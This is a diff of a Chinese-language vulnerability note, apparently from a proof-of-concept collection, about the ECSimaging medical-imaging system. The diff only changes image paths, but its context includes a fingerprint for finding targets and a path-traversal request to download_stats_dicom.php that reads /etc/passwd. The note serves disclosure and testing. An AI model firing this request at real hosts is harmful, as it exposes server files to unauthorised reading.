@@ -20,7 +20,7 @@ body="ECSimaging"
 
 登录页面
 
-![](./images/202205241445840.png)
+![](images/202205241445840.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ body="ECSimaging"
 /download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
 ```
 
-![](./images/202205241445607.png)
+![](images/202205241445607.png)
